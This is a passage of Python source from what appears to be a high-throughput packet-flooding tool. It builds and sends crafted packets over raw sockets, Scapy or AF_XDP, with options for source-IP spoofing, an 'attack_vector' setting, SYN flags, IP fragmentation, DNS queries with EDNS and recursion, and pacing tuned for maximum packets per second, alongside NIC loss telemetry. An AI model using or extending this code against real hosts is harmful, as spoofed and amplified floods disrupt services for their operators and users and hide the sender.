            curr_wire_source = str(acc.get("wire_counter_source", "") or "").strip()
            if not curr_wire_source or curr_wire_source in ("none", "unknown"):
                acc["wire_counter_source"] = item_wire_source
            elif curr_wire_source != item_wire_source and curr_wire_source != "mixed":
                acc["wire_counter_source"] = "mixed"
        item_wire_reason = str(it.get("wire_counter_reason", "") or "").strip()
        if item_wire_reason:
            curr_wire_reason = str(acc.get("wire_counter_reason", "") or "").strip()
            if not curr_wire_reason:
                acc["wire_counter_reason"] = item_wire_reason
            elif item_wire_reason not in curr_wire_reason:
                acc["wire_counter_reason"] = f"{curr_wire_reason};{item_wire_reason}"
        acc["wire_counter_confidence"] = max(
            float(acc.get("wire_counter_confidence", 0.0) or 0.0),
            float(it.get("wire_counter_confidence", 0.0) or 0.0),
        )
        acc["wire_tx_packets_delta"] += int(it.get("wire_tx_packets_delta", 0) or 0)
        acc["wire_tx_dropped_delta"] += int(it.get("wire_tx_dropped_delta", 0) or 0)
        acc["wire_tx_errors_delta"] += int(it.get("wire_tx_errors_delta", 0) or 0)
        acc["wire_tx_bytes_delta"] += int(it.get("wire_tx_bytes_delta", 0) or 0)
        item_nicq_avail = int(
            it.get(
                "nicq_counter_available",
                1 if ("nicq_pressure_delta" in it or "nicq_drop_delta" in it) else 0,
            )
            or 0
        )
        acc["nicq_counter_available"] = max(int(acc.get("nicq_counter_available", 0) or 0), item_nicq_avail)
        item_nicq_source = str(it.get("nicq_counter_source", "") or "").strip()
        if item_nicq_source:
            curr_nicq_source = str(acc.get("nicq_counter_source", "") or "").strip()
            if not curr_nicq_source or curr_nicq_source in ("none", "unknown"):
                acc["nicq_counter_source"] = item_nicq_source
            elif curr_nicq_source != item_nicq_source and curr_nicq_source != "mixed":
                acc["nicq_counter_source"] = "mixed"
        item_nicq_reason = str(it.get("nicq_counter_reason", "") or "").strip()
        if item_nicq_reason:
            curr_nicq_reason = str(acc.get("nicq_counter_reason", "") or "").strip()
            if not curr_nicq_reason:
                acc["nicq_counter_reason"] = item_nicq_reason
            elif item_nicq_reason not in curr_nicq_reason:
                acc["nicq_counter_reason"] = f"{curr_nicq_reason};{item_nicq_reason}"
        acc["nicq_counter_confidence"] = max(
            float(acc.get("nicq_counter_confidence", 0.0) or 0.0),
            float(it.get("nicq_counter_confidence", 0.0) or 0.0),
        )
        acc["nicq_pressure_delta"] += int(it.get("nicq_pressure_delta", 0) or 0)
        acc["nicq_drop_delta"] += int(it.get("nicq_drop_delta", 0) or 0)
        acc["nicq_fifo_delta"] += int(it.get("nicq_fifo_delta", 0) or 0)
        acc["nicq_timeout_delta"] += int(it.get("nicq_timeout_delta", 0) or 0)
        acc["nicq_restart_delta"] += int(it.get("nicq_restart_delta", 0) or 0)
        acc["nicq_busy_delta"] += int(it.get("nicq_busy_delta", 0) or 0)
        acc["wire_loss_est_packets"] += int(it.get("wire_loss_est_packets", 0) or 0)
        _raw_uncapped = int(it.get("wire_loss_raw_uncapped_packets", it.get("wire_loss_raw_packets", 0)) or 0)
        acc["wire_loss_raw_packets"] += int(it.get("wire_loss_raw_packets", _raw_uncapped) or 0)
        acc["wire_loss_raw_uncapped_packets"] += _raw_uncapped
        acc["gpu_template_h2d_copy_count"] += int(it.get("gpu_template_h2d_copy_count", 0) or 0)
        acc["gpu_template_h2d_copy_bytes"] += int(it.get("gpu_template_h2d_copy_bytes", 0) or 0)
        acc["gpu_rng_state_alloc_count"] += int(it.get("gpu_rng_state_alloc_count", 0) or 0)
        acc["gpu_rng_state_reuse_count"] += int(it.get("gpu_rng_state_reuse_count", 0) or 0)
        acc["l7_active_sessions_peak"] = max(
            int(acc.get("l7_active_sessions_peak", 0) or 0),
            int(it.get("l7_active_sessions_peak", 0) or 0),
        )
        item_l7_conn_rate = float(it.get("l7_conn_rate", 0.0) or 0.0)
        if item_l7_conn_rate > 0.0 or float(acc.get("l7_conn_rate", 0.0) or 0.0) == 0.0:
            acc["l7_conn_rate"] = item_l7_conn_rate
        acc["l7_handshake_p99_ms"] = max(
            float(acc.get("l7_handshake_p99_ms", 0.0) or 0.0),
            float(it.get("l7_handshake_p99_ms", 0.0) or 0.0),
        )
        item_l7_step_fail_ratio = float(it.get("l7_step_fail_ratio", 0.0) or 0.0)
        if item_l7_step_fail_ratio > 0.0 or float(acc.get("l7_step_fail_ratio", 0.0) or 0.0) == 0.0:
            acc["l7_step_fail_ratio"] = item_l7_step_fail_ratio
        item_session_success_rate = float(it.get("session_success_rate", 0.0) or 0.0)
        if item_session_success_rate > 0.0 or float(acc.get("session_success_rate", 0.0) or 0.0) == 0.0:
            acc["session_success_rate"] = item_session_success_rate
        item_retry_success_rate = float(it.get("retry_success_rate", 0.0) or 0.0)
        if item_retry_success_rate > 0.0 or float(acc.get("retry_success_rate", 0.0) or 0.0) == 0.0:
            acc["retry_success_rate"] = item_retry_success_rate
        item_dp_queue_id = int(it.get("dp_queue_id", -1) or -1)
        if item_dp_queue_id >= 0:
            curr_dp_queue_id = int(acc.get("dp_queue_id", -1) or -1)
            if curr_dp_queue_id < 0:
                acc["dp_queue_id"] = item_dp_queue_id
            elif curr_dp_queue_id != item_dp_queue_id:
                acc["dp_queue_id"] = -2
        item_dp_queue_strategy = str(it.get("dp_queue_strategy", "") or "").strip()
        if item_dp_queue_strategy:
            curr_dp_queue_strategy = str(acc.get("dp_queue_strategy", "") or "").strip()
            if not curr_dp_queue_strategy or curr_dp_queue_strategy == "unknown":
                acc["dp_queue_strategy"] = item_dp_queue_strategy
            elif curr_dp_queue_strategy != item_dp_queue_strategy and curr_dp_queue_strategy != "mixed":
                acc["dp_queue_strategy"] = "mixed"
        item_dp_affinity_cpu = int(it.get("dp_affinity_cpu", -1) or -1)
        if item_dp_affinity_cpu >= 0:
            curr_dp_affinity_cpu = int(acc.get("dp_affinity_cpu", -1) or -1)
            if curr_dp_affinity_cpu < 0:
                acc["dp_affinity_cpu"] = item_dp_affinity_cpu
            elif curr_dp_affinity_cpu != item_dp_affinity_cpu:
                acc["dp_affinity_cpu"] = -2
        if "sender_path" in it:
            acc["sender_path"] = str(it.get("sender_path") or "")
    return _recompute_loss_metrics(acc)


def close_sender_context(sender_context: Dict[str, Any] | None) -> None:
    """Best-effort cleanup for reusable sender resources."""
    if not isinstance(sender_context, dict):
        return
    dp_session = sender_context.pop("dataplane_session", None)
    if dp_session is not None and hasattr(dp_session, "close"):
        try:
            dp_session.close()
        except Exception:
            pass
    raw_sock = sender_context.pop("raw_socket", None)
    if raw_sock is not None:
        try:
            raw_sock.close()
        except Exception:
            pass

async def send_packet_async(packet, verbose, packet_no, loop, protocol):
    """Asynchronously send a packet using scapy in a thread executor."""
    def send_pkt(pkt):
        try:
            scapy = _scapy()
            iface = scapy.get_working_if()
            if pkt.haslayer('Ether'):
                scapy.sendp(pkt, iface=iface, realtime=True, verbose=False, return_packets=False)
            else:
                # L3 send should rely on OS routing, specifying iface can cause ARP issues
                scapy.send(pkt, realtime=True, verbose=False, return_packets=False)
            return True
        except ScapyUnavailableError:
            logging.error("Scapy is unavailable; cannot send packets in CPU/Scapy mode.")
            return False
        except Exception:
            logging.error(f"Packet send error for packet {packet_no}:\n{traceback.format_exc()}")
            return False

    result = await loop.run_in_executor(None, send_pkt, packet)
    
    if result and verbose:
        logging.info(f"Packet {packet_no} sent.")
    elif not result:
        logging.error(f"Packet {packet_no} failed to send.")
    
    return result

async def packet_sender(packet_config, count, delay=0.0, rps=0.0, jitter=0.0, ramp=0.0, verbose=False, live_sent=None, live_errors=None, live_progress=None):
    """
    Sends packets based on the provided configuration.
    Uses the zero-dependency CPU Packet Engine for fast packet generation,
    then sends via raw socket.  Falls back to Scapy only if the engine fails.
    """
    loop = asyncio.get_running_loop()
    sent_ok = 0
    send_err = 0
    packet_no = 0

    # Build a cpu_packet_engine.PacketConfig from the Scapy-compat config
    try:
        spoof_opts = None
        if hasattr(packet_config, 'spoof_opts') and packet_config.spoof_opts:
            spoof_opts = cpu_packet_engine.SpoofingOptions(
                mode=getattr(packet_config.spoof_opts, 'mode', 'realistic'),
                subnet=getattr(packet_config.spoof_opts, 'subnet', None),
                list_file=getattr(packet_config.spoof_opts, 'list_file', None),
            )

        engine_cfg = cpu_packet_engine.PacketConfig(
            target_ip=packet_config.target_ip,
            target_port=packet_config.target_port,
            protocol=getattr(packet_config, 'protocol', 'tcp'),
            spoof=getattr(packet_config, 'spoof', False),
            spoof_opts=spoof_opts,
            payload=getattr(packet_config, 'payload', None),
            tcp_flags=getattr(packet_config, 'tcp_flags', 'S'),
            ttl=getattr(packet_config, 'ttl', None),
            tos=getattr(packet_config, 'tos', None),
            window=getattr(packet_config, 'window', None),
            fragment_enabled=getattr(packet_config, 'fragment_enabled', False),
            fragment_size=getattr(packet_config, 'fragment_size', 800),
            pad_size=getattr(packet_config, 'pad_size', 0),
            attack_vector=getattr(packet_config, 'attack_vector', 'basic'),
            dns_name=getattr(packet_config, 'dns_name', 'example.com'),
            dns_qtype=getattr(packet_config, 'dns_qtype', 'A'),
            dns_edns=getattr(packet_config, 'dns_edns', False),
            dns_recursive=getattr(packet_config, 'dns_recursive', True),
        )
        use_cpu_engine = True
    except Exception as e:
        log_error(f"CPU Packet Engine config failed, falling back to Scapy: {e}")
        use_cpu_engine = False

    if use_cpu_engine:
        # ── Fast path: raw socket + CPU engine ──
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log_error("Raw socket creation failed. Please run with sudo/root.")
            return _stats(attempted=count, sent=0, errors=count)
        except Exception as e:
            log_error(f"Failed to create raw socket: {e}")
            return _stats(attempted=count, sent=0, errors=count)

        # Batch size for async yield
        BATCH_SIZE = 256
        dst_addr = (engine_cfg.target_ip, 0)
        sent_ok_snapshot = 0
        send_err_snapshot = 0

        try:
            for i in range(count):
                pkt_bytes = cpu_packet_engine.create_packet(engine_cfg)

                # Fragmentation
                if engine_cfg.fragment_enabled:
                    fragments = cpu_packet_engine.fragment_packet(
                        pkt_bytes,
                        fragment_size=max(8, engine_cfg.fragment_size),
                    )
                else:
                    fragments = [pkt_bytes]

                for frag in fragments:
                    packet_no += 1
                    try:
                        sock.sendto(frag, dst_addr)
                        sent_ok += 1
                    except Exception:
                        send_err += 1

                _update_live(live_progress, 1)

                # Rate limiting
                base_delay = 0.0
                if rps and rps > 0:
                    base_delay = 1.0 / float(rps)
                elif delay and delay > 0:
                    base_delay = float(delay)

                if base_delay > 0:
                    if jitter and jitter > 0:
                        j = base_delay * float(jitter)
                        await asyncio.sleep(max(0.0, base_delay + random.uniform(-j, j)))
                    else:
                        await asyncio.sleep(base_delay)

                # Yield every batch to keep event loop responsive
                if (i + 1) % BATCH_SIZE == 0:
                    _update_live(live_sent, sent_ok - sent_ok_snapshot)
                    _update_live(live_errors, send_err - send_err_snapshot)
                    sent_ok_snapshot = sent_ok
                    send_err_snapshot = send_err
                    await asyncio.sleep(0)

        except KeyboardInterrupt:
            pass
        finally:
            sock.close()

        _update_live(live_sent, sent_ok - sent_ok_snapshot)
        _update_live(live_errors, send_err - send_err_snapshot)

        return _stats(
            attempted=packet_no,
            sent=sent_ok,
            errors=max(0, packet_no - sent_ok) if send_err <= 0 else send_err,
            bytes_sent_est=sent_ok * len(pkt_bytes) if count > 0 else 0,
        )

    # ── Scapy fallback path ──
    try:
        scapy = _scapy()
    except ScapyUnavailableError:
        log_error("Both CPU Engine and Scapy unavailable; packet_sender cannot run.")
        return _stats(attempted=count, sent=0, errors=count)

    tasks = []
    MAX_INFLIGHT_TASKS = 1024

    async def _flush():
        nonlocal sent_ok, send_err
        if not tasks:
            return
        results = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        batch_sent = sum(1 for r in results if r is True)
        batch_err = len(results) - batch_sent
        sent_ok += batch_sent
        send_err += batch_err
        _update_live(live_sent, batch_sent)
        _update_live(live_errors, batch_err)

    for i in range(count):
        pkt = packet_utils.create_packet(packet_config)
        pkts_to_send = [pkt]

        if getattr(packet_config, "fragment_enabled", False):
            frag_size = int(getattr(packet_config, "fragment_size", 800) or 800)
            frag_size = max(8, frag_size)
            try:
                pkts_to_send = scapy.fragment(pkt, fragsize=frag_size)
            except Exception:
                pkts_to_send = [pkt]

        for p in pkts_to_send:
            packet_no += 1
            _update_live(live_progress, 1)
            tasks.append(loop.create_task(send_packet_async(p, verbose, packet_no, loop, packet_config.protocol)))
            if len(tasks) >= MAX_INFLIGHT_TASKS:
                await _flush()

        base_delay = 0.0
        if rps and rps > 0:
            base_delay = 1.0 / float(rps)
        elif delay and delay > 0:
            base_delay = float(delay)

        if base_delay > 0:
            if jitter and jitter > 0:
                j = base_delay * float(jitter)
                await asyncio.sleep(max(0.0, base_delay + random.uniform(-j, j)))
            else:
                await asyncio.sleep(base_delay)

    if tasks:
        await _flush()
    return _stats(
        attempted=packet_no,
        sent=sent_ok,
        errors=max(0, packet_no - sent_ok) if send_err <= 0 else send_err,
    )

# Lazy import fast_sender C extension
try:
    from . import fast_sender
    FAST_SENDER_AVAILABLE = True
except ImportError:
    FAST_SENDER_AVAILABLE = False

# Lazy import pacing engine
try:
    from .pacing import (
        PacingConfig, PacingMode, JitterModel,
        paced_send, paced_send_l2, get_stats, reset_stats, format_stats, cleanup_l2,
        PACING_ENGINE_AVAILABLE,
    )
except ImportError:
    PACING_ENGINE_AVAILABLE = False
    PacingConfig = None
    reset_stats = None

# Lazy import AF_XDP sender module
try:
    from .af_xdp_sender import XDPSender, XDPIntegration, check_xdp_available
    XDP_AVAILABLE = True
except ImportError:
    XDP_AVAILABLE = False
    XDPSender = None
    XDPIntegration = None
    check_xdp_available = lambda: (False, "AF_XDP module not available")


def get_gateway_info(target_ip):
    """
    Hedef IP için çıkış arayüzünü ve Gateway MAC adresini bulur.
    """
    cached = _GATEWAY_CACHE.get(target_ip)
    if cached is not None:
        ts, iface, mac_bytes = cached
        if (time.monotonic() - ts) <= _GATEWAY_CACHE_TTL_SEC:
            return iface, mac_bytes
    try:
        scapy = _scapy()
        conf = scapy.conf
        getmacbyip = scapy.getmacbyip
        # Get the interface and gateway IP for the target
        # conf.route.route(target_ip) returns (iface, gw_ip, src_ip)
        res = conf.route.route(target_ip)
        iface = res[0]
        gw_ip = res[1]
        
        # Resolve the MAC address of the gateway
        mac_str = getmacbyip(gw_ip)
        
        if not mac_str:
            # Fallback: try to read from /proc/net/arp (doesn't require root)
            try:
                with open("/proc/net/arp", "r") as f:
                    for line in f.readlines()[1:]:
                        parts = line.split() 
                        if len(parts) >= 4 and parts[0] == gw_ip:
                            mac_str = parts[3]
                            if mac_str != "00:00:00:00:00:00":
                                break
                            else:
                                mac_str = None
            except Exception:
                pass

        if not mac_str:
            # Fallback: try to get MAC of the target directly if no gateway (local network)
            mac_str = getmacbyip(target_ip)
            
        if not mac_str:
            log_error(f"Could not resolve MAC for gateway {gw_ip} or target {target_ip}")
            return iface, None

        mac_bytes = bytes.fromhex(mac_str.replace(":", ""))
        
        # DEBUG: Log MAC address for verification
        log_info(f"Gateway MAC resolved: {mac_str} ({len(mac_bytes)} bytes) on {iface}")
        _GATEWAY_CACHE[target_ip] = (time.monotonic(), iface, mac_bytes)
        return iface, mac_bytes
    except ScapyUnavailableError:
        log_error("Scapy is unavailable; cannot resolve gateway MAC.")
        return None, None
    except Exception as e:
        log_error(f"get_gateway_info error: {e}")
        return None, None


# ============================================================================
# AF_XDP High-Performance Sender
# ============================================================================

async def xdp_sender(
    packets_buffer: bytes,
    target_ip: str,
    target_port: int,
    count: int,
    verbose: bool = False,
    interface: str = None,
    queue_id: int = 0,
    batch_size: int = 64,
    sender_fallback_policy: str = "allow",
    fallback_backend: str = "python",
    sender_context: Dict[str, Any] | None = None,
) -> dict:
    """
    Send packets using AF_XDP for maximum performance.
    
    This function provides the highest possible packet-per-second rate
    by using Linux AF_XDP sockets (Copy Mode for compatibility).
    
    Args:
        packets_buffer: Contiguous buffer of raw IP packets
        target_ip: Target IP address (for interface detection)
        target_port: Target port (for logging)
        count: Number of packets in buffer
        verbose: Enable verbose logging
        interface: Network interface (auto-detected if None)
        batch_size: Batch size for TX
    
    Returns:
        Number of packets sent
    
    Requirements:
        - Linux kernel >= 4.18
        - Root privileges
        - XDP extension built (python setup.py build_ext --inplace)
    """
    fallback_policy = _resolve_sender_fallback_policy(sender_fallback_policy)
    fallback_backend = _resolve_sender_backend(fallback_backend)

    async def _fallback(reason: str, details: str = "") -> dict:
        if details:
            log_warning(f"[XDP] {details}")
        if fallback_policy == "fail":
            return _stats(
                attempted=count,
                sent=0,
                errors=count,
                sender_path="XDP_UNAVAILABLE",
                fallback_count=1,
                sender_fallback_reason=str(reason),
                sender_backend_requested="xdp",
                sender_fallback_policy=fallback_policy,
            )
        out = await raw_socket_sender(
            packets_buffer,
            target_ip,
            target_port,
            count,
            verbose,
            sender_backend=fallback_backend,
            sender_fallback_policy=fallback_policy,
            sender_context=sender_context,
        )
        out = dict(out or {})
        out["sender_backend_requested"] = "xdp"
        out["sender_fallback_policy"] = fallback_policy
        out["fallback_count"] = int(out.get("fallback_count", 0) or 0) + 1
        if not str(out.get("sender_fallback_reason", "") or "").strip():
            out["sender_fallback_reason"] = str(reason)
        elif str(out.get("sender_fallback_reason", "")).strip().lower() == "none":
            out["sender_fallback_reason"] = str(reason)
        return out

    if not XDP_AVAILABLE:
        return await _fallback(
            reason="xdp_module_unavailable",
            details="AF_XDP module not available. Build with: python setup.py build_ext --inplace",
        )
    
    # Check XDP availability
    available, msg = check_xdp_available()
    if not available:
        return await _fallback(
            reason="xdp_unavailable",
            details=f"Not available: {msg}",
        )
    
    # Calculate packet size
    packet_size = len(packets_buffer) // count if count > 0 else 0
    if packet_size == 0:
        log_error("[XDP] Invalid packet buffer")
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="XDP_INVALID_BUFFER",
            sender_fallback_reason="xdp_invalid_buffer",
            sender_backend_requested="xdp",
            sender_fallback_policy=fallback_policy,
        )
    packets_buffer, normalize_meta = _normalize_packets_buffer(
        packets_buffer,
        required_bytes=packet_size * count,
        pool_key="senders_xdp_tx",
        return_meta=True,
    )
    
    log_info(f"[XDP] Initializing AF_XDP sender for {target_ip}:{target_port}")
    log_info(f"[XDP] Packets: {count}, Packet Size: {packet_size} bytes, Batch Size: {batch_size}")
    
    total_sent = 0
    sender_path = "XDP_L2"
    fallback_reason = "none"
    fallback_count = 0
    
    try:
        # Create sender with auto-fallback
        sender = XDPSender(
            interface=interface,
            queue_id=int(queue_id or 0),
            batch_size=batch_size,
            auto_fallback=True
        )
        
        sender.start()
        
        if sender.is_using_xdp:
            log_info(f"[XDP] Using AF_XDP on interface: {sender.interface}")
        else:
            log_info(f"[XDP] Using fallback mode on interface: {sender.interface}")
            sender_path = "XDP_INTERNAL_FALLBACK"
            fallback_reason = "xdp_internal_fallback"
            fallback_count = 1
            if fallback_policy == "fail":
                sender.stop()
                return _stats(
                    attempted=count,
                    sent=0,
                    errors=count,
                    sender_path="XDP_UNAVAILABLE",
                    fallback_count=1,
                    sender_fallback_reason=fallback_reason,
                    sender_backend_requested="xdp",
                    sender_fallback_policy=fallback_policy,
                    buffer_copy_count=int(normalize_meta.get("buffer_copy_count", 0) or 0),
                    buffer_copy_bytes=int(normalize_meta.get("buffer_copy_bytes", 0) or 0),
                )
        
        # Prefer contiguous-buffer API when available to avoid Python list overhead.
        if hasattr(sender, "send_buffer"):
            sent = sender.send_buffer(packets_buffer, packet_size, count)
            total_sent = int(sent or 0)
        else:
            # Fallback path: send batch lists.
            mv = memoryview(packets_buffer)
            needs_bytes = False
            batch_start = 0
            while batch_start < count:
                batch_end = min(batch_start + batch_size, count)
                batch_views = []
                for i in range(batch_start, batch_end):
                    start = i * packet_size
                    end = start + packet_size
                    batch_views.append(mv[start:end])

                if needs_bytes:
                    sent = sender.send([bytes(v) for v in batch_views])
                else:
                    try:
                        sent = sender.send(batch_views)  # may work if extension uses buffer protocol
                    except TypeError:
                        needs_bytes = True
                        sent = sender.send([bytes(v) for v in batch_views])

                total_sent += sent

                if verbose and total_sent % 10000 < batch_size:
                    stats = sender.get_stats()
                    log_info(f"[XDP] Progress: {total_sent}/{count} packets, "
                            f"{stats.packets_per_second:.0f} pps, {stats.mbps:.2f} Mbps")

                batch_start = batch_end
        
        # Get final stats
        stats = sender.get_stats()
        log_info(f"[XDP] Completed: {stats.tx_packets:,} packets, "
                f"{stats.tx_bytes:,} bytes, "
                f"{stats.packets_per_second:,.0f} pps, "
                f"{stats.mbps:.2f} Mbps")
        
        sender.stop()
        
    except Exception as e:
        log_error(f"[XDP] Error: {e}")
        if verbose:
            import traceback
            traceback.print_exc()
        return await _fallback(reason="xdp_runtime_error", details=f"Runtime error: {e}")
    
    return _stats(
        attempted=count,
        sent=total_sent,
        errors=max(0, count - total_sent),
        bytes_sent_est=total_sent * packet_size,
        sender_path=sender_path,
        fallback_count=fallback_count,
        sender_fallback_reason=fallback_reason,
        sender_backend_requested="xdp",
        sender_fallback_policy=fallback_policy,
        buffer_copy_count=int(normalize_meta.get("buffer_copy_count", 0) or 0),
        buffer_copy_bytes=int(normalize_meta.get("buffer_copy_bytes", 0) or 0),
        eagain_retry_count=0,
        partial_send_retry_count=0,
    )


async def raw_socket_sender(
    packets_buffer,
    target_ip,
    target_port,
    count,
    verbose,
    live_sent=None,
    live_errors=None,
    live_progress=None,
    force_l2=False,
    sender_backend=None,
    sender_fallback_policy=None,
    sender_context: Dict[str, Any] | None = None,
    xdp_enable: bool = False,
    xdp_interface: str | None = None,
    xdp_queue_id: int = 0,
):
    """
    Sends a buffer of pre-created raw packets using a raw socket.
    Optimized with C extension (fast_sender) or sendmmsg for Linux.
    """
    requested_backend = _resolve_sender_backend(sender_backend)
    if bool(xdp_enable) and requested_backend == "auto":
        requested_backend = "xdp"
    fallback_policy = _resolve_sender_fallback_policy(sender_fallback_policy)

    if requested_backend == "xdp":
        return await xdp_sender(
            packets_buffer=packets_buffer,
            target_ip=target_ip,
            target_port=target_port,
            count=count,
            verbose=verbose,
            interface=xdp_interface,
            queue_id=int(xdp_queue_id or 0),
            sender_fallback_policy=fallback_policy,
            fallback_backend="auto",
            sender_context=sender_context,
        )

    s = None
    owns_socket = False
    ctx = sender_context if isinstance(sender_context, dict) else None
    try:
        cached_socket = None
        if isinstance(ctx, dict):
            cached_socket = ctx.get("raw_socket")
            if cached_socket is not None and getattr(cached_socket, "fileno", lambda: -1)() < 0:
                cached_socket = None
                ctx.pop("raw_socket", None)
        if cached_socket is not None:
            s = cached_socket
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            owns_socket = True
            if isinstance(ctx, dict):
                ctx["raw_socket"] = s
    except PermissionError:
        log_error("Raw socket creation failed. Please run the script with sudo/root privileges.")
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="NONE",
            permission_error_count=1,
            fallback_count=0,
            sender_fallback_reason="raw_socket_permission_denied",
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=0,
            buffer_copy_bytes=0,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )
    except Exception as e:
        log_error(f"Failed to create raw socket: {e}")
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="NONE",
            permission_error_count=0,
            fallback_count=0,
            sender_fallback_reason="raw_socket_init_failed",
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=0,
            buffer_copy_bytes=0,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )

    log_info(f"Raw socket sender initialized. Sending {count} packets...")
    
    packet_size = len(packets_buffer) // count if count > 0 else 0
    if packet_size == 0 and count > 0:
        log_error("Packet buffer is empty or count is zero, cannot determine packet size.")
        if owns_socket and s is not None:
            s.close()
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="NONE",
            sender_fallback_reason="invalid_packet_buffer",
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=0,
            buffer_copy_bytes=0,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )
    packets_buffer, normalize_meta = _normalize_packets_buffer(
        packets_buffer,
        required_bytes=packet_size * count,
        pool_key="senders_raw_tx",
        return_meta=True,
    )

    sent_total = 0
    sender_path = "PYTHON_SENDTO"  # default fallback
    fallback_count = 0
    fallback_reasons = []
    permission_error_count = 0
    eagain_retry_count = 0
    partial_send_retry_count = 0
    buffer_copy_count = int(normalize_meta.get("buffer_copy_count", 0) or 0)
    buffer_copy_bytes = int(normalize_meta.get("buffer_copy_bytes", 0) or 0)
    txring_flush_call_count = 0
    txring_flush_error_count = 0
    txring_flush_eagain_count = 0
    txring_flush_enobufs_count = 0
    txring_flush_ebusy_count = 0
    txring_flush_other_errno_count = 0
    txring_flush_last_errno = 0
    txring_flush_last_errno_name = "NONE"
    txring_frame_wait_ns = 0
    txring_poll_count = 0
    flush_mode = "unknown"
    txring_tp_packets = 0
    txring_tp_drops = 0
    txring_tp_freeze_q_cnt = 0
    txring_packet_version = 0
    txring_packet_version_name = "TPACKET_UNKNOWN"
    txring_batch_target = 0
    txring_backoff_ns = 0
    buffer_reuse_hits = 0

    def _register_fallback(reason: str) -> None:
        nonlocal fallback_count
        fallback_count += 1
        r = str(reason or "").strip()
        if r and r not in fallback_reasons:
            fallback_reasons.append(r)

    loss_iface_hint = _resolve_loss_iface(None)
    loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)

    allow_fallback = (fallback_policy == "allow")
    dp_hot_path_only = bool(isinstance(ctx, dict) and ctx.get("dataplane_hot_path_only", False))
    dp_open_error = ""
    if isinstance(ctx, dict):
        dp_open_error = str(ctx.get("dataplane_open_error", "") or "").strip()

    # In-proc dataplane core path.
    # required mode: always return dataplane outcome (single hot-path).
    # auto mode: if dataplane cannot send, legacy TX_RING/C/Python chain may continue.
    dp_session = ctx.get("dataplane_session") if isinstance(ctx, dict) else None
    if dp_session is not None and hasattr(dp_session, "send_batch"):
        dp_out = None
        try:
            dp_out = dp_session.send_batch(
                packets_buffer=packets_buffer,
                packet_size=packet_size,
                count=count,
                target_ip=target_ip,
                target_port=target_port,
            )
        except Exception as e:
            _register_fallback(f"dataplane_exception:{type(e).__name__}")
            if dp_hot_path_only:
                if owns_socket and s is not None:
                    s.close()
                _update_live(live_progress, int(count))
                _update_live(live_errors, int(count))
                return _stats(
                    attempted=count,
                    sent=0,
                    errors=count,
                    sender_path="DP_SEND_FAILED",
                    permission_error_count=0,
                    fallback_count=max(1, int(fallback_count)),
                    sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "dataplane_exception",
                    sender_backend_requested=requested_backend,
                    sender_fallback_policy=fallback_policy,
                    buffer_copy_count=buffer_copy_count,
                    buffer_copy_bytes=buffer_copy_bytes,
                    eagain_retry_count=0,
                    partial_send_retry_count=0,
                )
        if dp_out is not None:
            if hasattr(dp_out, "to_stats"):
                dp_stats = dict(dp_out.to_stats() or {})
            elif isinstance(dp_out, dict):
                dp_stats = dict(dp_out or {})
            else:
                dp_stats = {}
            dp_attempted = int(dp_stats.get("attempted", count) or count)
            dp_sent = int(dp_stats.get("sent", 0) or 0)
            dp_errors = int(dp_stats.get("errors", max(0, dp_attempted - dp_sent)) or 0)
            dp_reason = str(dp_stats.get("sender_fallback_reason", "none") or "none").strip()
            if dp_reason and dp_reason.lower() != "none":
                _register_fallback(dp_reason)
            if owns_socket and s is not None:
                s.close()
            _update_live(live_progress, int(dp_attempted))
            _update_live(live_sent, int(dp_sent))
            _update_live(live_errors, int(max(dp_errors, dp_attempted - dp_sent)))
            out = _stats(
                attempted=dp_attempted,
                sent=dp_sent,
                errors=max(dp_errors, dp_attempted - dp_sent),
                bytes_sent_est=int(
                    dp_stats.get("bytes_sent_est", int(dp_sent) * int(max(0, int(packet_size or 0)))) or 0
                ),
                sender_path=str(dp_stats.get("sender_path", "DP_CORE") or "DP_CORE"),
                fallback_count=max(
                    int(dp_stats.get("fallback_count", 0) or 0),
                    int(fallback_count or 0),
                ),
                sender_fallback_reason=(
                    ";".join(fallback_reasons) if fallback_reasons else str(dp_reason or "none")
                ),
                sender_backend_requested=requested_backend,
                sender_fallback_policy=fallback_policy,
                buffer_copy_count=buffer_copy_count,
                buffer_copy_bytes=buffer_copy_bytes,
                eagain_retry_count=0,
                partial_send_retry_count=0,
            )
            for k in ("dp_queue_id", "dp_queue_strategy", "dp_affinity_cpu", "session_success_rate", "retry_success_rate"):
                if k in dp_stats:
                    out[k] = dp_stats[k]
            return _attach_loss_telemetry(out, loss_before_snapshot, preferred_iface=loss_iface_hint)
    elif dp_hot_path_only:
        if owns_socket and s is not None:
            s.close()
        _update_live(live_progress, int(count))
        _update_live(live_errors, int(count))
        reason = dp_open_error or "dataplane_session_missing"
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="DP_UNAVAILABLE",
            permission_error_count=0,
            fallback_count=1,
            sender_fallback_reason=reason,
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=buffer_copy_count,
            buffer_copy_bytes=buffer_copy_bytes,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )

    try_txring = bool(force_l2) or requested_backend in {"auto", "txring"}
    try_c_ext_l3 = requested_backend in {"auto", "txring", "c_ext_l3"}
    try_python = requested_backend in {"auto", "txring", "c_ext_l3", "python"}
    if not allow_fallback:
        if requested_backend in {"auto", "txring"}:
            try_c_ext_l3 = False
            try_python = False
        elif requested_backend == "c_ext_l3":
            try_python = False

    if bool(force_l2) and not FAST_SENDER_AVAILABLE:
        _register_fallback("txring_unavailable")
